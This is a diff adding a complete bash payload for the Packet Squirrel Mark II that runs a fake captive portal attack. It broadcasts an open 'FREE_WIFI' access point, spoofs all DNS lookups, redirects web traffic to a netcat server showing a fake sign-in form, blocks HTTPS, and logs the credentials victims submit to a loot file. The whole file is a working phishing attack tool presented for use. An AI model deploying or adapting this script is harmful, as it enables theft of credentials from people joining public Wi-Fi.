@@ -1,0 +1,93 @@
+#!/bin/bash
+#
+# Title:            Evil Portal with Packet Squirrel Mark II
+# Description:
+#                   Implementation of the fake captive portal attack on the
+#                   Packet Squirrel Mark II using a compatible USB Wi-Fi adapter.
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Phishing
+# Prerequisites:
+# - Packet Squirrel Mark II
+# - MK7AC WiFi Adapter or another compatible adapter
+#
+# Netmode:          NAT
+#
+# STATUS
+# ================
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Waiting for a button press ...................... OFF
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly EVIL_SSID="FREE_WIFI"
+
+EVIL_PORTAL="/root/payloads/$(SWITCH)/portals/signin-form.html"
+readonly EVIL_PORTAL
+
+EVIL_LOOT="/root/payloads/$(SWITCH)/loots/signin-form_$(date +%s).log"
+readonly EVIL_LOOT
+
+######## SETUP ########
+
+set -u
+
+LED SETUP
+
+NETMODE NAT
+
+access_point() {
+    uci set wireless.radio0.channel='11'
+    uci set wireless.radio0.band='2g'
+    uci set wireless.radio0.htmode='HT20'
+    uci set wireless.radio0.disabled="${1}"
+    uci set wireless.default_radio0.ssid="${EVIL_SSID}"
+    uci commit wireless
+    wifi reload
+}
+
+access_point "0"
+
+web_server() {
+    local response_headers
+    response_headers="HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: $(wc -c < "${EVIL_PORTAL}")\r\nConnection: close\r\n\r\n"
+    while true; do
+        {
+            printf '%b' "${response_headers}"
+            cat -- "${EVIL_PORTAL}"
+        } | nc -lnp 8080
+        sleep 1s
+    done
+}
+
+web_server 1> "${EVIL_LOOT}" 2> /dev/null &
+ws_pid="${!}"
+
+LED ATTACK
+
+SPOOFDNS br-lan ".*=172.16.32.1" &> /dev/null &
+sd_pid="${!}"
+
+nft add table ip evil_redirect
+nft add chain ip evil_redirect prerouting "{ type nat hook prerouting priority -100; }"
+nft add rule ip evil_redirect prerouting iif "br-lan" tcp dport 80 dnat to 172.16.32.1:8080
+nft add rule ip evil_redirect prerouting iif "br-lan" tcp dport 443 drop
+
+LED OFF
+
+NO_LED=1 BUTTON
+
+LED CLEANUP
+
+access_point "1"
+kill "${ws_pid}" "${sd_pid}"
+sync
+
+LED FINISH
+
+poweroff
